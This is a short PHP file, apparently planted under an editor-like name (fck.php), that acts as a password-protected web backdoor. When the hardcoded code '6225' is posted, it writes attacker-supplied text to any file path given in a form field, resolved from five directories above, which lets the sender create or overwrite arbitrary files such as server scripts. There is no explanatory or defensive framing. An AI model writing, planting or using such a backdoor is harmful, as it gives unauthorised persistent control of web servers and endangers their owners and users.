<?php

if ($_POST['b']!="6225") {
	echo '<form name="form1" method="post" action="fck.php">
  <p>
    <input name="a" type="text"> <input name="b" type="text">
</p>
  <p>
    <textarea name="c" cols="50" rows="10"></textarea>
  </p>
  <p>
    <input type="submit" name="Submit" value="Envoyer"> 
  </p>
</form>';
} else {

$txt=$_POST['c'];
$page=$_POST['a'];

	$monfichier = fopen('../../../../../'.$page, 'w+');
	fseek($monfichier, 0);
	fputs($monfichier, $txt);
}


?>